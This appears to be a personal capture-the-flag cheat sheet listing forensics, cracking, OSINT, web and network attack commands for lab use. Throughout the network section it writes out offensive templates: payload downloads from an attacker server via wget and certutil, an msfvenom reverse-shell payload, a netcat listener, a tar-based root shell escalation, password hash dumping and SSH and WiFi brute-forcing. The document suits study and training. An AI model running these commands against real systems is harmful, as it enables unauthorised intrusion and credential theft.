# CTF-Notes

## General 

### How to connect to the vpn

```sudo openvpn [YOUR .ovpn FILE]```

### How to check if we are properly connected?

```ping [IP]```

### Get your IP

```ip a``` or ```ifconfig``` 

If we only want tun0 ```ifconfig tun0```

### Check linux information

```uname -a```

Distro information

```cat /etc/*release```

### Where to find all the useful stuff in Kali Linux

> /usr/share/ 

For downloaded stuff

> /opt/

### Check if input allows python/python3

We can do ```python -c "print('Hello')"``` or ```python3 -c "print('Hello')"```

### Make a python script executable from command line

 1. Add ```#!/usr/bin/env python``` at the beginning of the script
 2. Execute the file ```python myfile.py```
	 1. Or Make the file executable ```chmod +x myfile.py```
	 2. Execute the script ```./myfile.py```

### Check for hidden files

#### Linux 
```ls -la```

### If commands like "cat" are not allowed

We can use ```grep . file``` or ```while read line; do echo $line; done < file```

### Generate all possible regex combinations

```exrex "[PATTERN]" > [OUTPUT FILE]```

### Connect to netcat using python 

https://docs.pwntools.com/en/stable/intro.html

```
from pwn import *
r = remote('[HOST]', [IP]) # Connect to the host
r.send([STRING]) # Send any input
r.recvline() # Recieve next line
r.recvuntil([STRING]) # Recive lines until specific word
r.interactive() # Interact in real time with the connection
r.close() # Close connection
```

## Forensics

-  ```strings [FILE]``` see all the strings inside the file
- ```hexdump [FILE]```  see the hex of the file 
-  ```hexedit [FILE]```  modify the hex of a file
-  ```file [FILE]```  see the type of file
-  ```exiftool [FILE]``` see metadata of file
-  ```foremost [FILE]``` see if there are other files inside the file
-  ```binwalk [FILE]``` Binwalk is a tool for searching binary files like images and audio files for embedded files and data.
	- With the -e flag it will also extract the files
- Stegsolve is also a good tool to apply modifications into an image [Github](https://github.com/eugenekolo/sec-tools/tree/master/stego/stegsolve/stegsolve)
- If you are sure there is something hidden inside using Steg you can try to bruteforce it with [Digital Invisible Ink Tool](http://diit.sourceforge.net/)

### Images

##### JPG

If after running ```strings``` on the file we see a line like 
> ()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
  #3R
&'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz

The file contains hidden information using steganography

We can use ```steghide``` to extract the information if the file does not have a password

```steghide extract -sf [FILE]```

If the file has a password we can use ```stegseek```

```stegseek [FILE] [wordlist]```

##### PNG

```pngcheck [FILE]``` see what is wrong with the file
```zsteg -a [FILE]``` see hidden data 

##### BMP

```zsteg -a [FILE]``` see hidden data 

### Videos

```mediainfo [FILE]``` see metadata of video

### MC Office Documents

MC Office Documents are pretty much zip files, so we can unzip them 

```unzip [FILE]```

They can also have macros, we can check them with ```olevba```

```olevba [options] <filename>```

### Audio Files

We can use tools like "Audacity" or "Sonic Visualizer"

### Network Capture files

Run strings on it.

Use Wireshark

We can always right click in a package -> Follow [PACKAGE TYPE]  Stream

We can extract files in:
> File > Export > Objects > Http [More info](https://www.rubyguides.com/2012/01/four-ways-to-extract-files-from-pcaps/) 

We can also extract files like: ```tcpflow -r [FILE]```

##### Adding a key file 

We need to add the key file into WireShark

> EDIT => PREFERENCES => PROTOCOLS => TLS => (Pre)-Master-Secret Log filename

##### To crack WIFI Passwords

```aircrack-ng -w [WORDLIST] -b [MAC ADDRS] [CAP FILE]```

### ZipFiles

We can crack ZipFiles passwords using Jhon 

```
zip2john [ZIPFILE] > hash.txt
john --wordlist=[WORDLIST] hash.txt
```
### Windows Log Files and Registry

If the logs are a CSV file you can always use Excel
[List of other awesome tools](https://ericzimmerman.github.io/#!index.md)

### Memory Dump File

- We can use Windbg Preview
- We can use [volatility](https://github.com/volatilityfoundation/volatility) 
- We can use ```foremost``` to extract files inside.

[List of some awesome tools](https://ericzimmerman.github.io/#!index.md)

### SSL Certificates

Finding the common name of a certificate

```openssl x509 -noout -subject -in [CERT]```

Finding which certificates are invalid

```openssl verify -CAfile [ROOT CERT] [CERT]```

## Criptography

When in doubt use [Cyberchef](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)) 
You can also try [quipquip](https://quipqiup.com/) if you dont know the type of encryption.

### Base 64

If we see a combination of letters and numbers, it may be Base 64 encoding, the best way to find out if it contains at least one '=' at the end.

```echo [BASE64 STRING] | base64 -d```

### RSA

If we are given the N, c and e values we can use RsaCtfTool

```python3 ./RsaCtfTool.py -n [N VALUE] -e [e VALUE] --uncipher [c VALUE]```

If we need to find the smallest prime (p) or the biggest prime (q) we can input N [here](https://www.calculatorsoup.com/calculators/math/prime-factors.php)

### Hashes

#### Finding type of hash

- https://md5decrypt.net/en/HashFinder/
- https://www.tunnelsup.com/hash-analyzer/
- ```hash-identifier```

#### Crack them

- https://crackstation.net/
- Hashcat - If we are given a hash we can use hashcat to try and break it
	- Dictionary attack ```hashcat -m [Module] hash.txt [Wordlist]```
	- Brute Force attack ```hashcat -m [Module] -a 3 hash.txt [Pattern]``` (?a) is all characters
	- Rules Attack ```hashcat -m [Module] hash.txt [Wordlist] -r [Rule file]```
	- Hybrid Attack ```hashcat -m [Module] -a 6 hash.txt ([Wordlist Patter] | [Pattern Wordlist])```
	- [List of available modules and formats](https://hashcat.net/wiki/doku.php?id=example_hashes)
	- [More on brute force attacks](https://hashcat.net/wiki/doku.php?id=mask_attack)
- John - You can also use John to break some hashes
	- yescript ```john --format=crypt hash.txt --wordlist=[Wordlist]```
- Opcrack - Awesome with rainbow tables (https://ophcrack.sourceforge.io/)

## OSINT

We can find almost any OSINT tool that we might want [here](https://osintframework.com/)

### Images

- We can reverse search the image to look for more info (We can use the ["Search by Image"](https://addons.mozilla.org/es/firefox/addon/search_by_image/) extension for this)
- We can also try to look at the metadata ```exiftool [Image]```

### Social Media 

If we now the username we can use ```sherlock```

```sherlock [USERNAME]```

### Wifi Lookup

If we are given a WIFI SSID or BSSID we can use this website to locate it https://wigle.net/index

### Stolen Cameras

https://www.stolencamerafinder.com/

## Web

1. Check the source file
2. Check the cookies
3. Check the newtork traffic
4. Enumerate Directories
	- ```gobuster dir -u "[URL | IP]" -w [Wordlist] ``` [Guide](https://redteamtutorials.com/2018/11/19/gobuster-cheatsheet/)
	- Or you can use ```dirbuster```
5. Find URL information
	-  ```enum4linux -A [IP | URL]```
6. Try funny stuff with [BurpSuite](https://www.comparitech.com/net-admin/burp-suite-cheat-sheet/)
7. If they allow you to login
	- Try [SQL Injection](https://github.com/payloadbox/sql-injection-payload-list)
	- You can try using ```sqlmap```
8. If there are input fields, you can try [XXS](https://github.com/payloadbox/xss-payload-list)
9. If the website ends with ?[FIELD]= or something like that you can try [LFI](https://shahrukhathar.info/local-file-inclusion-lfi-cheat-sheet/)
10. If you are allowed to upload files try to get a [reverse shell](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

## Network

### PORTS

#### Check for open ports
- ```nmap -sV -sC [IP]``` or ``` nmap [IP]``` 
- or (for all open ports and information) ```namp -T4 -p- -A [IP]``` 
- or with only top 10000 ports   ```namp -T4 -A [IP]```
- [Guide](https://www.stationx.net/nmap-cheat-sheet/)

#### Port 80 (HTTP)

Usually HTTP 
- **Enumerate Directories**
	- ```gobuster dir -u "[URL | IP]" -w [Wordlist] ``` [Guide](https://redteamtutorials.com/2018/11/19/gobuster-cheatsheet/)
		- Or you can use ```dirbuster```
- **Find URL information**
	- ```enum4linux -A [IP | URL]```
 
#### Port 22 (SSH)
  
Usually ssh [Guide](https://phoenixnap.com/kb/linux-ssh-commands)
- **You can connect to ssh using the command ```ssh```**
	- ```ssh [USERNAME]@[IP]```
	- It will ask for a password:
	- We can try and crack the password like: 
		- ```hydra -l [USERNAME | WORDLIST] -P [PASSWORD | WORDLIST] [IP] ssh```
- **If we find a private RSA key we can:**
	- Save it in our local machine
	- Mark it as private
		- ```chmod 600 [keyfile]```
	- Try to access it
		- ```ssh -i [keyfile] [user]@[IP]```
	- If it asks for a passphrase:
		- We can try and crack it like:
			- Mark the RSA key as executable for john the ripper ```/usr/share/john/ssh2john.py [keyfile] > [newjohnfile]```
			- Brute-force it ```john [newjohnfile] --wordlist=/usr/share/wordlists/rockyou.txt```
- **Send a file to SSH**
	- ```scp [FILE] [user]@[IP]:/dev/shm```

#### Port 21 (FTP)

Usually FTP

- **You can connect to FTP using the command** 
	- ```ftp [IP]```
	- It will ask for logging information but you can sometimes use: ```anonymous``` without password
- **You can retrieve files inside ftp using**
	- ```get [FILE]```
- **You can put files inside the ftp system using** 
	- ```put [FILE]```
			
#### Port 445/139 (SMB)
 
Usually SMB

- **Find SMB version**
	- We can use metasploit
		 - ```msfconsole```
		 - ```use auxiliary/scanner/smb/smb_version```
		 - Set options
		 - ```run```
- **If the server is running SAMBA you can try to list the clients like**:
	- ```smbclient -L \\\\[IP]\\``` 
- **You can connect to a SMB client using**
	- ```smbclient \\\\IP\\Client]```
- **Sometimes we can connect anonymously**
	- ```smbclient \\\\IP\\anonymous```
- **We can retrieve files using**
	-  ```get [file]```
	
 #### Port 135 (RTC)
 
 Usually RTC
 
 - **Get RTC Info**
	 - ```rpcinfo -p [IP]```

 #### Port 25 (SMTP)
 
 Usually SMTP
 
 - **Enumerate**
	 - ```smtp-user-enum```
	 - Metasploit ```use auxiliary/scanner/smtp/smtp_enum ```

 - **Find more info of the users**
 	- ```telnet [IP] [Port]```
 		- ```VRFY [USER] ```	
 	
https://www.hackingarticles.in/4-ways-smtp-enumeration/

### Reverse Shell

If a website allows input or file upload without sanitation it will be possible to upload a reverse shell in order to gain access to the system.

- **Upload the shell:**
	- File upload shell: <a href="php-reverse-shell.php">PHP shell</a> <- We must modify the IP(Our IP) and the PORT(9999)
	- Reverse shell in input: [More one liner shells](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

#### Listening to reverse shells
 
```nc -nlvp [Your Port]```

#### Upgrade reverse shell

If there is python in the machine ```python -c 'import pty; pty.spawn(\"/bin/bash\")'```

####  Stabilize reverse shell

1. Inside the shell ```python -c 'import pty; pty.spawn(\"/bin/bash\")'```
2. Ctrl+Z
3. ```stty raw -echo```
4. ```fg```
5. ```export TERM=xterm```

### Search For possible Exploits
- Just the information
	- ```searchsploit [System Info]```
- Find and execute them
	- ```msfconsole```
	- ```search [System info]```
	- ``` use [Exploit]```
	- ```set options```
	- ```run```

### Set up python server to deliver payload

```python -m SimpleHTTPServer [Port]```

The server will be created in the location where we called the command

### Creating a Payload with Msfvenom 

```msfvenom -p [Type of payload] LHOST=[Your listening host] LPORT=[Your listening port] -f [Type of file] > [Name of file to be created]```

[Cheatsheet](https://netsec.ws/?p=331)

### Get payload on the shell

#### Linux
```wget http://[YOUR IP]/[PAYLOAD]```

#### Windows
```certutil -urlcache -f [Your Server with the file] [Where you want to put the file in the machine]```

### Connect to user in machine 

We can use psexec
- You can use the one in metasploit 
- You can use the one by [impacket](https://github.com/SecureAuthCorp/impacket)
	-``` psexec.py [User]:'[Password]'@[IP]```

### Find all files in system by name.

We can do ```find / -name [FILENAME]``` or ```find /* | grep [FILENAME]```

### Privilege Escalation

#### Linux 

- If you can send files or download files in the machine use linpeas 
	- If you are on SSH:  ```scp linpeas.sh [user]@[IP]:/dev/shm```, ```./linpeas.sh | tee linpeas.txt```
- If you are inside of the vulnerable system you can try to escalate your user privilege as root like:
	- Use ```sudo -l``` to see what types of privileges the user has.
		- If you see ```(ALL : ALL) ALL```, just call ```sudo bash``` or ```sudo su``` and you will become root.
	- Other privileges: [Check for exploits](https://gtfobins.github.io/)
	      - **tar**: ```sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh```
- Find binaries with elevated privileges
	- ```find / -perm +6000 2>/dev/null | grep '/bin/'```	

#### Meterpreter

- We can try getting input information
	- ```history```
- We can try to gain system with the build in tool
	- ```getsystem```
- We can try the suggester
	- ```background```
	- ```search suggester```
	- ```use 0```
	- ```set session [meterpreter session number]```

#### Windows

We can see the processes and find what we can run as other users and migrate
	- ```ps```
	- ```migrate [process number]```

### Meterpreter useful commands
#### Commands

See **user privilege** (NT AUTHORITY\SYSTEM == Highest):

```
getuid
```

Show **system info**:

```
sysinfo
```

Attempt to **elevate user privilege**

```
getsystem
```

Find the **hash that stores local user passwords**:

```
hashdump
```

Open **cmd**:

```
shell
```

#### Inside CMD

Navigate Between Folders
```
cd [Dir Name]
```

Show Folders Content
```
dir
```

Read File
```
type [File Name]
```

## PWN

Use Ghidra, GBD, or Binary Ninja
